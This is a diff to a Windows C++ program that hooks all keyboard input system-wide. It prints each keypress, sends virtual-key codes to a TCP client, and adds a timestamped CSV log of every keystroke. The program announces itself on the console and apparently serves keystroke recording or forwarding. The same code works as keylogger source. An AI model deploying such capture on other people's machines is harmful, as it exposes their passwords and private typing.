@@ -11,11 +11,14 @@
 #define WIN32_LEAN_AND_MEAN     //TCP
 #endif                          //TCP
 
+#define _CRT_SECURE_NO_DEPRECATE //To use fopen() and localtime() 
+
 #include <iostream>
 #include <Windows.h>    // HOOKS
 #include <winsock2.h>   // TCP
 #include <ws2tcpip.h>   // TCP
 #include <stdlib.h>     // TCP
+#include <ctime>        // LOG
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "Ws2_32.lib")             //TCP
@@ -25,6 +28,7 @@
 // HHOOK variable
 HHOOK hHook{ NULL };
 SOCKET ClientSocket = INVALID_SOCKET;
+char filename[80];
 
 /*
  * Event Handler (callback funtion), it is called in response to a change in the state of a key
@@ -32,6 +36,7 @@ SOCKET ClientSocket = INVALID_SOCKET;
  */
 LRESULT CALLBACK CatchLowLevelKeyboardProc(const int nCode, const WPARAM wParam, const LPARAM lParam)
 {
+	FILE * pFile;
 	// lParam is cast as KBDLLHOOKSTRUCT
 	KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lParam);
 
@@ -44,13 +49,16 @@ LRESULT CALLBACK CatchLowLevelKeyboardProc(const int nCode, const WPARAM wParam,
 		UINT key = (keyInfo.scanCode << 16);
 		GetKeyNameText((LONG)key, buffer, sizeof(buffer));
 		wprintf(L"KEYDOWN event, Virtual-Key Code = %#.2X. Key Name = %s \r\n", keyInfo.vkCode, buffer);
+		// Write Log
+		pFile = fopen(filename, "a");
+		fwprintf(pFile, L"%d, %d, %s\r\n", keyInfo.time, keyInfo.vkCode, buffer);
+		fclose(pFile);
 		if (ClientSocket != INVALID_SOCKET)
 		{
 			unsigned char buf[1];
 			buf[0] = (keyInfo.vkCode >> 0);
 			int iSendResult = send(ClientSocket, (char*)buf, sizeof(buf), 0);
 			printf("Byte sent = %#.2X \r\n", buf[0]);
-			// Write in the file
 		}
 		break;
 	}
@@ -159,7 +167,14 @@ int main(int argc, char* argv[])
 		}
 	}
 	Sleep(2000);
-
+	// Create filename for log from time
+	time_t rawtime;
+	struct tm * timeinfo;
+	time(&rawtime);
+	timeinfo = localtime(&rawtime);
+	strftime(filename, 80, "log%Y%m%d_%H%M%S_vk.csv", timeinfo);
+	puts(filename);
+	
 	// Installing HOOK
 	printf("Installing the hook\r\n");
 	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, CatchLowLevelKeyboardProc, NULL, 0);
